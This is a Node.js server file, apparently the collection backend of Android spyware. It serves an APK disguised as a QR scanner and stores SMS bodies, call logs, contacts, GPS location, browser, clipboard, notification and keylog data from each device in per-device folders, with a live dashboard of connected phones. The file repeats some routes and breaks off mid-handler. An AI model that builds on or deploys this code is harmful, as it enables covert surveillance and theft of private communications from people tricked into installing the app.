/*
Mobile Data Collection System v2.0
Secure Development Platform
*/

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const chalk = require('chalk');
const os = require('os');

// Console logs
const log = {
    info: (msg) => console.log(chalk.blue('[INFO]'), msg),
    success: (msg) => console.log(chalk.green('[SUCCESS]'), msg),
    warning: (msg) => console.log(chalk.yellow('[WARNING]'), msg),
    error: (msg) => console.log(chalk.red('[ERROR]'), msg),
    data: (msg) => console.log(chalk.magenta('[DATA]'), msg),
    device: (msg) => console.log(chalk.cyan('[DEVICE]'), msg),
    server: (msg) => console.log(chalk.yellow('[SERVER]'), msg)
};

// Dynamic IP detection
const getLocalIP = () => {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const interface of interfaces[name]) {
      if (interface.family === 'IPv4' && !interface.internal) {
        return interface.address;
      }
    }
  }
  return 'localhost';
};

const LOCAL_IP = getLocalIP();

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: "*" }
});

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Data directory
const DATA_DIR = path.join(__dirname, 'veri_kayitlari');
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
  log.info(`Data directory created: ${DATA_DIR}`);
}

// Device data
const devices = new Map();
const dataStats = {
  totalData: 0,
  smsCount: 0,
  callCount: 0,
  locationCount: 0,
  appUsageCount: 0,
  keylogCount: 0,
  browserCount: 0,
  appStatusCount: 0,
  contactsCount: 0,
  mediaCount: 0,
  deviceCount: 0,
  notificationCount: 0,
  clipboardCount: 0
};

// Data deduplication
const processedData = new Map();

// Reset statistics
dataStats.totalData = 0;
dataStats.smsCount = 0;
dataStats.callCount = 0;
dataStats.locationCount = 0;
dataStats.appUsageCount = 0;
dataStats.keylogCount = 0;
dataStats.browserCount = 0;
dataStats.appStatusCount = 0;
dataStats.contactsCount = 0;
dataStats.mediaCount = 0;
dataStats.deviceCount = 0;
dataStats.notificationCount = 0;
dataStats.clipboardCount = 0;
devices.clear();

// Lock screen
app.get('/lock', (req, res) => {
  if (req.hostname !== 'localhost' && req.hostname !== '127.0.0.1') return res.status(404).send('Not Found');
  res.sendFile(path.join(__dirname, 'lockscreen.html'));
});

// App preview
app.get('/preview', (req, res) => {
  if (req.hostname !== 'localhost' && req.hostname !== '127.0.0.1') return res.status(404).send('Not Found');
  res.sendFile(path.join(__dirname, 'app_preview.html'));
});

// Test dashboard
app.get('/test', (req, res) => {
  if (req.hostname !== 'localhost' && req.hostname !== '127.0.0.1') return res.status(404).send('Not Found');
  res.sendFile(path.join(__dirname, 'test_dashboard.html'));
});

// QR Monitor
app.get('/qr', (req, res) => {
  res.sendFile(path.join(__dirname, 'qr_monitor.html'));
});

// APK Download
app.get('/download', (req, res) => {
  const apkPath = path.join(__dirname, 'APK_Dosyalari', 'qr_scanner_debug_20260421_234553.apk');
  if (fs.existsSync(apkPath)) {
    res.download(apkPath, 'QRScanner.apk', (err) => {
      if (err) {
        log.error('APK download error: ' + err.message);
        res.status(500).send('Download failed');
      } else {
        log.info('APK downloaded successfully');
      }
    });
  } else {
    res.status(404).send('APK file not found');
  }
});

// API endpoints
app.get('/api/stats', (req, res) => {
  res.json({
    qrScanCount: dataStats.qrScanCount || 0,
    deviceCount: devices.size,
    totalData: dataStats.totalData || 0,
    appUsageCount: dataStats.appUsageCount || 0,
    systemInfoCount: dataStats.systemInfoCount || 0,
    locationCount: dataStats.locationCount || 0,
    contactsCount: dataStats.contactsCount || 0,
    smsCount: dataStats.smsCount || 0,
    callCount: dataStats.callCount || 0,
    browserCount: dataStats.browserCount || 0,
    notificationCount: dataStats.notificationCount || 0,
    clipboardCount: dataStats.clipboardCount || 0
  });
});

// Data endpoint for Android devices
app.post('/data', (req, res) => {
  try {
    const data = req.body;
    
    // Create or update device
    const deviceId = data.deviceId || 'unknown';
    const device = devices.get(deviceId) || {
      id: deviceId,
      name: data.deviceName || 'Android Device',
      type: 'android',
      lastSeen: new Date().toISOString()
    };
    
    device.lastSeen = new Date().toISOString();
    devices.set(deviceId, device);
    dataStats.deviceCount = devices.size;
    
    // Process data type
    switch(data.type) {
      case 'qr_scan':
        dataStats.qrScanCount++;
        log.data(`QR Scan received: ${data.data}`);
        break;
      case 'app_usage':
        dataStats.appUsageCount++;
        log.data(`App usage received: ${data.data}`);
        break;
      case 'system_info':
        dataStats.systemInfoCount++;
        log.data(`System info received: ${data.data}`);
        break;
      case 'location':
        dataStats.locationCount++;
        log.data(`Location received: ${data.data}`);
        break;
      case 'contacts':
        dataStats.contactsCount++;
        log.data(`Contacts received: ${data.data}`);
        break;
      case 'sms':
        dataStats.smsCount++;
        log.data(`SMS received: ${data.data}`);
        break;
      case 'call':
        dataStats.callCount++;
        log.data(`Call received: ${data.data}`);
        break;
      case 'browser':
        dataStats.browserCount++;
        log.data(`Browser received: ${data.data}`);
        break;
    }
    
    dataStats.totalData++;
    
    // Create device folder with safe name
    const safeDeviceName = (device.name || 'Unknown_Device').replace(/[^a-zA-Z0-9_-]/g, '_');
    const deviceFolder = path.join(DATA_DIR, `${safeDeviceName}_${deviceId.substring(0, 8)}`);
    
    if (!fs.existsSync(deviceFolder)) {
      fs.mkdirSync(deviceFolder, { recursive: true });
      log.info(`Created device folder: ${deviceFolder}`);
    }
    
    // Save data to device folder
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const dataFile = path.join(deviceFolder, `${data.type}_${timestamp}.json`);
    
    // Format data based on type for better readability
    let formattedData = data.data;
    
    if (data.type === 'contacts') {
      try {
        const contacts = JSON.parse(data.data);
        formattedData = JSON.stringify({
          deviceInfo: {
            deviceName: device.name,
            deviceId: deviceId,
            collectedAt: new Date().toISOString()
          },
          totalContacts: contacts.length,
          contacts: contacts.map(c => ({
            name: c.name || 'Unknown',
            phone: c.phone || 'N/A'
          }))
        }, null, 2);
      } catch (e) {
        log.error('Error formatting contacts:', e);
      }
    } else if (data.type === 'sms') {
      try {
        const smsList = JSON.parse(data.data);
        formattedData = JSON.stringify({
          deviceInfo: {
            deviceName: device.name,
            deviceId: deviceId,
            collectedAt: new Date().toISOString()
          },
          totalSMS: smsList.length,
          messages: smsList.map(s => ({
            from: s.address || 'Unknown',
            message: s.body || '',
            date: s.date || '',
            type: s.type === '1' ? 'Received' : s.type === '2' ? 'Sent' : 'Other'
          }))
        }, null, 2);
      } catch (e) {
        log.error('Error formatting SMS:', e);
      }
    } else if (data.type === 'call') {
      try {
        const calls = JSON.parse(data.data);
        formattedData = JSON.stringify({
          deviceInfo: {
            deviceName: device.name,
            deviceId: deviceId,
            collectedAt: new Date().toISOString()
          },
          totalCalls: calls.length,
          calls: calls.map(c => ({
            number: c.number || 'Unknown',
            duration: `${c.duration || 0} seconds`,
            date: c.date || '',
            type: c.type === '1' ? 'Incoming' : c.type === '2' ? 'Outgoing' : c.type === '3' ? 'Missed' : 'Other'
          }))
        }, null, 2);
      } catch (e) {
        log.error('Error formatting calls:', e);
      }
    } else if (data.type === 'location') {
      try {
        const loc = JSON.parse(data.data);
        formattedData = JSON.stringify({
          deviceInfo: {
            deviceName: device.name,
            deviceId: deviceId,
            collectedAt: new Date().toISOString()
          },
          location: {
            latitude: loc.latitude || 'N/A',
            longitude: loc.longitude || 'N/A',
            accuracy: loc.accuracy || 'N/A',
            timestamp: loc.timestamp || new Date().toISOString()
          }
        }, null, 2);
      } catch (e) {
        log.error('Error formatting location:', e);
      }
    }
    
    fs.writeFileSync(dataFile, formattedData);
    log.info(`Data saved to: ${dataFile}`);
    
    // Also save raw data as backup
    const rawFile = path.join(deviceFolder, `${data.type}_${timestamp}_raw.json`);
    fs.writeFileSync(rawFile, JSON.stringify({
      deviceId,
      deviceName: device.name,
      type: data.type,
      timestamp: data.timestamp || new Date().toISOString(),
      data: data.data
    }, null, 2));
    
    // Emit to all connected clients
    io.emit('dataReceived', data);
    io.emit('dataUpdate', { type: data.type, deviceId, stats: dataStats });
    io.emit('deviceConnect', device);
    
    log.data(`Data processed: ${data.type} from ${device.name} (${deviceId})`);
    res.json({ success: true, message: 'Data received', device: device.name });
    
  } catch (error) {
    log.error('Error processing data:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/devices', (req, res) => {
  const deviceArray = Array.from(devices.values()).map(device => ({
    id: device.id,
    name: device.name || 'Bilinmeyen Cihaz',
    lastSeen: device.lastSeen || new Date().toISOString(),
    type: device.type || 'unknown'
  }));
  res.json(deviceArray);
});

// Recent data endpoint
const recentData = [];
const MAX_RECENT = 50;

app.get('/api/recent-data', (req, res) => {
  res.json(recentData);
});

// Modify data endpoint to store recent data
app.post('/data', (req, res) => {
  try {
    const data = req.body;
    
    // Create or update device
    const deviceId = data.deviceId || 'unknown';
    const device = devices.get(deviceId) || {
      id: deviceId,
      name: data.deviceName || 'Android Device',
      type: 'android',
      lastSeen: new Date().toISOString()
    };
    
    device.lastSeen = new Date().toISOString();
    devices.set(deviceId, device);
    dataStats.deviceCount = devices.size;
    
    // Store in recent data
    recentData.unshift({
      type: data.type,
      data: data.data,
      deviceId: deviceId,
      timestamp: data.timestamp || new Date().toISOString()
    });
    
    // Keep only max
    if (recentData.length > MAX_RECENT) {
      recentData.pop();
    }
    
    // Process data type
    switch(data.type) {
      case 'qr_scan':
        dataStats.qrScanCount++;
        log.data(`QR Scan received: ${data.data}`);
        break;
      case 'app_usage':
        dataStats.appUsageCount++;
        log.data(`App usage received: ${data.data}`);
        break;
      case 'system_info':
        dataStats.systemInfoCount++;
        log.data(`System info received: ${data.data}`);
        break;
      case 'location':
        dataStats.locationCount++;
        log.data(`Location received: ${data.data}`);
        break;
      case 'contacts':
        dataStats.contactsCount++;
        log.data(`Contacts received: ${data.data}`);
        break;
      case 'sms':
        dataStats.smsCount++;
        log.data(`SMS received: ${data.data}`);
        break;
      case 'call':
        dataStats.callCount++;
        log.data(`Call received: ${data.data}`);
        break;
      case 'browser':
        dataStats.browserCount++;
        log.data(`Browser received: ${data.data}`);
        break;
      case 'notification':
        dataStats.notificationCount++;
        log.data(`Notification received: ${data.data}`);
        break;
      case 'clipboard':
        dataStats.clipboardCount++;
        log.data(`Clipboard received: ${data.data}`);
        break;
    }
    
    dataStats.totalData++;
    
    // Create device folder with safe name
    const safeDeviceName = (device.name || 'Unknown_Device').replace(/[^a-zA-Z0-9_-]/g, '_');
    const deviceFolder = path.join(DATA_DIR, `${safeDeviceName}_${deviceId.substring(0, 8)}`);
    
    if (!fs.existsSync(deviceFolder)) {
      fs.mkdirSync(deviceFolder, { recursive: true });
      log.info(`Created device folder: ${deviceFolder}`);
    }
    
    // Save data to device folder
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const dataFile = path.join(deviceFolder, `${data.type}_${timestamp}.json`);
    
    // Format data based on type for better readability
    let formattedData = data.data;
    if (data.type === 'contacts') {
      try {
        const contacts = JSON.parse(data.data);
        formattedData = JSON.stringify({
          deviceInfo: {
            deviceName: device.name,
            deviceId: deviceId,
            collectedAt: new Date().toISOString()
          },
          totalContacts: contacts.length,
          contacts: contacts.map(c => ({
            name: c.name || 'Unknown',
            phone: c.phone || 'N/A'
          }))
        }, null, 2);
      } catch (e) {
        log.error('Error formatting contacts:', e);
      }
    } else if (data.type === 'sms') {
      try {
        const smsList = JSON.parse(data.data);
        formattedData = JSON.stringify({
          deviceInfo: {
            deviceName: device.name,
            deviceId: deviceId,
            collectedAt: new Date().toISOString()
          },
          totalSMS: smsList.length,
          messages: smsList.map(s => ({
            from: s.address || 'Unknown',
            message: s.body || '',
            date: s.date || '',
            type: s.type === '1' ? 'Received' : s.type === '2' ? 'Sent' : 'Other'
          }))
        }, null, 2);
      } catch (e) {
        log.error('Error formatting SMS:', e);
      }
    } else if (data.type === 'call') {
      try {
        const calls = JSON.parse(data.data);
        formattedData = JSON.stringify({
          deviceInfo: {
            deviceName: device.name,
            deviceId: deviceId,
            collectedAt: new Date().toISOString()
          },
          totalCalls: calls.length,
          calls: calls.map(c => ({
            number: c.number || 'Unknown',
            duration: `${c.duration || 0} seconds`,
            date: c.date || '',
            type: c.type === '1' ? 'Incoming' : c.type === '2' ? 'Outgoing' : c.type === '3' ? 'Missed' : 'Other'
          }))
        }, null, 2);
      } catch (e) {
        log.error('Error formatting calls:', e);
      }
    } else if (data.type === 'location') {
      try {
        const loc = JSON.parse(data.data);
        formattedData = JSON.stringify({
          deviceInfo: {
            deviceName: device.name,
            deviceId: deviceId,
            collectedAt: new Date().toISOString()
          },
          location: {
            latitude: loc.latitude || 'N/A',
            longitude: loc.longitude || 'N/A',
            accuracy: loc.accuracy || 'N/A',
            timestamp: loc.timestamp || new Date().toISOString()
          }
        }, null, 2);
      } catch (e) {
        log.error('Error formatting location:', e);
      }
    }
    
    fs.writeFileSync(dataFile, formattedData);
    log.info(`Data saved to: ${dataFile}`);
    
    // Also save raw data as backup
    const rawFile = path.join(deviceFolder, `${data.type}_${timestamp}_raw.json`);
    fs.writeFileSync(rawFile, JSON.stringify({
      deviceId,
      deviceName: device.name,
      type: data.type,
      timestamp: data.timestamp || new Date().toISOString(),
      data: data.data
    }, null, 2));
    
    // Emit to all connected clients
    io.emit('dataReceived', data);
    io.emit('dataUpdate', { type: data.type, deviceId, stats: dataStats });
    io.emit('deviceConnect', device);
    
    log.data(`Data processed: ${data.type} from ${device.name} (${deviceId})`);
    res.json({ success: true, message: 'Data received', device: device.name });
    
  } catch (error) {
    log.error('Error processing data:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Main page - Professional Admin Panel
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin_panel.html'));
});

// Legacy admin panel (localhost only)
app.get('/legacy', (req, res) => {
  if (req.hostname !== 'localhost' && req.hostname !== '127.0.0.1') return res.status(404).send('Not Found');
  
  const indexHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Monitor Panel</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            margin-bottom: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            text-align: center;
            transition: transform 0.3s ease;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
        }
        
        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: #2a5298;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #666;
            font-size: 0.9em;
        }
        
        .devices-section {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .device-card {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 15px;
            border-left: 4px solid #2a5298;
        }
        
        .device-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .device-name {
            font-weight: bold;
            color: #2a5298;
        }
        
        .device-status {
            background: #28a745;
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.8em;
        }
        
        .connection-info {
            margin-top: 10px;
            color: #666;
            font-size: 0.9em;
        }
        
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        
        .live-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #28a745;
            border-radius: 50%;
            animation: pulse 2s infinite;
            margin-right: 10px;
        }
        
        /* On-screen keyboard styles */
        .keyboard-toggle {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #2a5298;
            color: white;
            border: none;
            padding: 15px;
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            z-index: 1000;
            font-size: 20px;
            transition: all 0.3s ease;
        }
        
        .keyboard-toggle:hover {
            background: #1e3c72;
            transform: scale(1.1);
        }
        
        .keyboard-toggle.pinned {
            background: #28a745;
        }
        
        .virtual-keyboard {
            position: fixed;
            bottom: -400px;
            left: 50%;
            transform: translateX(-50%);
            background: #2c3e50;
            border-radius: 15px 15px 0 0;
            padding: 20px;
            box-shadow: 0 -5px 20px rgba(0,0,0,0.3);
            z-index: 999;
            transition: bottom 0.3s ease;
            width: 90%;
            max-width: 800px;
        }
        
        .virtual-keyboard.visible {
            bottom: 0;
        }
        
        .keyboard-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #4a5568;
        }
        
        .keyboard-title {
            color: white;
            font-weight: bold;
            font-size: 14px;
        }
        
        .keyboard-controls {
            display: flex;
            gap: 10px;
        }
        
        .keyboard-btn {
            background: #4a5568;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            transition: background 0.2s ease;
        }
        
        .keyboard-btn:hover {
            background: #2d3748;
        }
        
        .keyboard-btn.pin {
            background: #28a745;
        }
        
        .keyboard-row {
            display: flex;
            justify-content: center;
            margin-bottom: 8px;
            gap: 5px;
        }
        
        .key {
            background: #4a5568;
            color: white;
            border: none;
            padding: 15px 10px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 500;
            min-width: 35px;
            transition: all 0.2s ease;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        
        .key:hover {
            background: #2d3748;
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
        }
        
        .key:active {
            transform: translateY(0);
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        
        .key.space {
            min-width: 200px;
        }
        
        .key.backspace, .key.tab, .key.caps, .key.enter, .key.shift {
            min-width: 80px;
            background: #e53e3e;
        }
        
        .key.shift.active {
            background: #38a169;
        }
        
        .key.caps.active {
            background: #38a169;
        }
        
        .key-display {
            background: #1a202c;
            color: white;
            padding: 10px;
            border-radius: 8px;
            margin-bottom: 15px;
            min-height: 40px;
            font-family: monospace;
            font-size: 14px;
            text-align: left;
            word-break: break-all;
            border: 1px solid #4a5568;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>System Monitor Panel</h1>
            <p>Real-time Data Collection System</p>
            <div class="connection-info">
                Server: http://${LOCAL_IP}:3001
            </div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number" id="totalData">0</div>
                <div class="stat-label">Total Data</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="smsCount">0</div>
                <div class="stat-label">SMS Messages</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="callCount">0</div>
                <div class="stat-label">Call Logs</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="locationCount">0</div>
                <div class="stat-label">Locations</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="appUsageCount">0</div>
                <div class="stat-label">App Usage</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="deviceCount">0</div>
                <div class="stat-label">Connected Devices</div>
            </div>
        </div>
        
        <div class="devices-section">
            <h2><span class="live-indicator"></span>Connected Devices</h2>
            <div id="devicesList">
                <p style="color: #666; text-align: center; padding: 20px;">No devices connected yet</p>
            </div>
        </div>
    </div>
    
    <!-- Keyboard toggle button -->
    <button class="keyboard-toggle" id="keyboardToggle" title="Toggle Keyboard">
        ⌨️
    </button>
    
    <!-- Virtual keyboard -->
    <div class="virtual-keyboard" id="virtualKeyboard">
        <div class="keyboard-header">
            <div class="keyboard-title">🖥️ Sanal Klavye</div>
            <div class="keyboard-controls">
                <button class="keyboard-btn" onclick="clearKeyboardDisplay()">Temizle</button>
                <button class="keyboard-btn" id="pinBtn" onclick="togglePin()">Sabitle</button>
                <button class="keyboard-btn" onclick="toggleKeyboard()">Kapat</button>
            </div>
        </div>
        
        <div class="key-display" id="keyDisplay">Metin burada görünecek...</div>
        
        <div class="keyboard-row">
            <button class="key" onclick="typeKey('1')">1</button>
            <button class="key" onclick="typeKey('2')">2</button>
            <button class="key" onclick="typeKey('3')">3</button>
            <button class="key" onclick="typeKey('4')">4</button>
            <button class="key" onclick="typeKey('5')">5</button>
            <button class="key" onclick="typeKey('6')">6</button>
            <button class="key" onclick="typeKey('7')">7</button>
            <button class="key" onclick="typeKey('8')">8</button>
            <button class="key" onclick="typeKey('9')">9</button>
            <button class="key" onclick="typeKey('0')">0</button>
            <button class="key backspace" onclick="backspace()">⌫</button>
        </div>
        
        <div class="keyboard-row">
            <button class="key" onclick="typeKey('q')">Q</button>
            <button class="key" onclick="typeKey('w')">W</button>
            <button class="key" onclick="typeKey('e')">E</button>
            <button class="key" onclick="typeKey('r')">R</button>
            <button class="key" onclick="typeKey('t')">T</button>
            <button class="key" onclick="typeKey('y')">Y</button>
            <button class="key" onclick="typeKey('u')">U</button>
            <button class="key" onclick="typeKey('i')">I</button>
            <button class="key" onclick="typeKey('o')">O</button>
            <button class="key" onclick="typeKey('p')">P</button>
            <button class="key" onclick="typeKey('ğ')">Ğ</button>
            <button class="key" onclick="typeKey('ü')">Ü</button>
        </div>
        
        <div class="keyboard-row">
            <button class="key tab" onclick="typeKey('\t')">Tab</button>
            <button class="key" onclick="typeKey('a')">A</button>
            <button class="key" onclick="typeKey('s')">S</button>
            <button class="key" onclick="typeKey('d')">D</button>
            <button class="key" onclick="typeKey('f')">F</button>
            <button class="key" onclick="typeKey('g')">G</button>
            <button class="key" onclick="typeKey('h')">H</button>
            <button class="key" onclick="typeKey('j')">J</button>
            <button class="key" onclick="typeKey('k')">K</button>
            <button class="key" onclick="typeKey('l')">L</button>
            <button class="key" onclick="typeKey('ş')">Ş</button>
            <button class="key" onclick="typeKey('ı')">I</button>
        </div>
        
        <div class="keyboard-row">
            <button class="key caps" id="capsBtn" onclick="toggleCaps()">Caps Lock</button>
            <button class="key" onclick="typeKey('z')">Z</button>
            <button class="key" onclick="typeKey('x')">X</button>
            <button class="key" onclick="typeKey('c')">C</button>
            <button class="key" onclick="typeKey('v')">V</button>
            <button class="key" onclick="typeKey('b')">B</button>
            <button class="key" onclick="typeKey('n')">N</button>
            <button class="key" onclick="typeKey('m')">M</button>
            <button class="key" onclick="typeKey('ö')">Ö</button>
            <button class="key" onclick="typeKey('ç')">Ç</button>
            <button class="key" onclick="typeKey('.')">.</button>
            <button class="key" onclick="typeKey(',')">,</button>
        </div>
        
        <div class="keyboard-row">
            <button class="key shift" id="shiftBtn" onclick="toggleShift()">Shift</button>
            <button class="key" onclick="typeKey(' ')">Space</button>
            <button class="key enter" onclick="typeKey('\n')">Enter</button>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        
        // Keyboard state
        let keyboardVisible = false;
        let keyboardPinned = false;
        let capsLockOn = false;
        let shiftOn = false;
        let keyboardText = '';
        
        // Keyboard functions
        function toggleKeyboard() {
            const keyboard = document.getElementById('virtualKeyboard');
            const toggleBtn = document.getElementById('keyboardToggle');
            
            keyboardVisible = !keyboardVisible;
            
            if (keyboardVisible) {
                keyboard.classList.add('visible');
                toggleBtn.textContent = '🔽';
            } else {
                keyboard.classList.remove('visible');
                toggleBtn.textContent = '⌨️';
            }
        }
        
        function togglePin() {
            const toggleBtn = document.getElementById('keyboardToggle');
            const pinBtn = document.getElementById('pinBtn');
            
            keyboardPinned = !keyboardPinned;
            
            if (keyboardPinned) {
                toggleBtn.classList.add('pinned');
                pinBtn.classList.add('pin');
                pinBtn.textContent = 'Sabitsiz';
            } else {
                toggleBtn.classList.remove('pinned');
                pinBtn.classList.remove('pin');
                pinBtn.textContent = 'Sabitle';
            }
        }
        
        function typeKey(key) {
            const display = document.getElementById('keyDisplay');
            
            if (capsLockOn || shiftOn) {
                key = key.toUpperCase();
                if (shiftOn) {
                    shiftOn = false;
                    document.getElementById('shiftBtn').classList.remove('active');
                }
            } else {
                key = key.toLowerCase();
            }
            
            // Handle special characters
            if (key === '\\T') key = '\t';
            if (key === '\\N') key = '\n';
            
            keyboardText += key;
            display.textContent = keyboardText || 'Metin burada görünecek...';
            
            // Auto-hide if not pinned after typing
            if (!keyboardPinned && keyboardVisible) {
                setTimeout(() => {
                    if (!keyboardPinned) {
                        toggleKeyboard();
                    }
                }, 2000);
            }
        }
        
        function backspace() {
            const display = document.getElementById('keyDisplay');
            keyboardText = keyboardText.slice(0, -1);
            display.textContent = keyboardText || 'Metin burada görünecek...';
        }
        
        function clearKeyboardDisplay() {
            const display = document.getElementById('keyDisplay');
            keyboardText = '';
            display.textContent = 'Metin burada görünecek...';
        }
        
        function toggleCaps() {
            const capsBtn = document.getElementById('capsBtn');
            capsLockOn = !capsLockOn;
            
            if (capsLockOn) {
                capsBtn.classList.add('active');
            } else {
                capsBtn.classList.remove('active');
            }
        }
        
        function toggleShift() {
            const shiftBtn = document.getElementById('shiftBtn');
            shiftOn = !shiftOn;
            
            if (shiftOn) {
                shiftBtn.classList.add('active');
            } else {
                shiftBtn.classList.remove('active');
            }
        }
        
        // Keyboard toggle button event
        document.getElementById('keyboardToggle').addEventListener('click', toggleKeyboard);
        
        // Keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.key === 'k') {
                e.preventDefault();
                toggleKeyboard();
            }
            if (e.ctrlKey && e.key === 'p') {
                e.preventDefault();
                togglePin();
            }
        });
        
        // Update statistics
        function updateStats() {
            fetch('/api/stats')
                .then(response => response.json())
                .then(data => {
                    document.getElementById('totalData').textContent = data.totalData;
                    document.getElementById('smsCount').textContent = data.smsCount;
                    document.getElementById('callCount').textContent = data.callCount;
                    document.getElementById('locationCount').textContent = data.locationCount;
                    document.getElementById('appUsageCount').textContent = data.appUsageCount;
                    document.getElementById('deviceCount').textContent = data.deviceCount;
                });
        }
        
        // Update devices list
        function updateDevices() {
            fetch('/api/devices')
                .then(response => response.json())
                .then(data => {
                    const devicesList = document.getElementById('devicesList');
                    if (data.length === 0) {
                        devicesList.innerHTML = '<p style="color: #666; text-align: center; padding: 20px;">No devices connected yet</p>';
                    } else {
                        devicesList.innerHTML = data.map(device => \`
                            <div class="device-card">
                                <div class="device-info">
                                    <div>
                                        <div class="device-name">\${device.name}</div>
                                        <div class="connection-info">Last seen: \${new Date(device.lastSeen).toLocaleString()}</div>
                                    </div>
                                    <div class="device-status">Online</div>
                                </div>
                            </div>
                        \`).join('');
                    }
                });
        }
        
        // Initial update
        updateStats();
        updateDevices();
        
        // Update every 5 seconds
        setInterval(() => {
            updateStats();
            updateDevices();
        }, 5000);
        
        // Real-time updates
        socket.on('dataUpdate', () => {
            updateStats();
        });
        
        socket.on('deviceConnect', () => {
            updateDevices();
        });
        
        socket.on('deviceDisconnect', () => {
            updateDevices();
        });
    </script>
</body>
</html>`;
  
  res.send(indexHtml);
});

// API endpoints
app.get('/api/stats', (req, res) => {
  if (req.hostname !== 'localhost' && req.hostname !== '127.0.0.1') return res.status(404).send('Not Found');
  res.json(dataStats);
});

app.get('/api/devices', (req, res) => {
  if (req.hostname !== 'localhost' && req.hostname !== '127.0.0.1') return res.status(404).send('Not Found');
  const deviceList = Array.from(devices.values()).map(device => ({
    id: device.id,
    name: device.name || 'Unknown Device',
    lastSeen: device.lastSeen,
    model: device.model || 'Unknown',
    battery: device.battery || 0,
    network: device.network || 'Unknown'
  }));
  res.json(deviceList);
});

// Socket.io connection handling
io.on('connection', (socket) => {
  log.server('New connection established');
  
  socket.on('deviceConnect', (deviceInfo) => {
    const deviceId = deviceInfo.id || socket.id;
    const device = {
      id: deviceId,
      name: deviceInfo.name || 'Unknown Device',
      model: deviceInfo.model || 'Unknown',
      battery: deviceInfo.battery || 0,
      network: deviceInfo.network || 'Unknown',
      lastSeen: new Date().toISOString(),
      connectedAt: new Date().toISOString()
    };
    
    devices.set(deviceId, device);
    dataStats.deviceCount = devices.size;
    
    log.device(`Device connected: ${device.name} (${deviceId})`);
    io.emit('deviceConnect', device);
  });
  
  socket.on('dataReceived', (data) => {
    if (!data || !data.type) return;
    
    const deviceId = data.deviceId || socket.id;
    const device = devices.get(deviceId);
    
    if (device) {
      device.lastSeen = new Date().toISOString();
      devices.set(deviceId, device);
    }
    
    // Update statistics based on data type
    switch (data.type) {
      case 'sms':
        dataStats.smsCount++;
        break;
      case 'call':
        dataStats.callCount++;
        break;
      case 'location':
        dataStats.locationCount++;
        break;
      case 'appUsage':
        dataStats.appUsageCount++;
        break;
      case 'keylog':
        dataStats.keylogCount++;
        break;
      case 'browser':
        dataStats.browserCount++;
        break;
      case 'appStatus':
        dataStats.appStatusCount++;
        break;
      case 'contacts':
        dataStats.contactsCount++;
        break;
      case 'media':
        dataStats.mediaCount++;
        break;
    }
    
    dataStats.totalData++;
    
    // Save data to file
    const dataFile = path.join(DATA_DIR, `${deviceId}_${data.type}.json`);
    fs.writeFileSync(dataFile, JSON.stringify({
      deviceId,
      type: data.type,
      timestamp: new Date().toISOString(),
      data: data.data
    }, null, 2));
    
    log.data(`Data received: ${data.type} from ${deviceId}`);
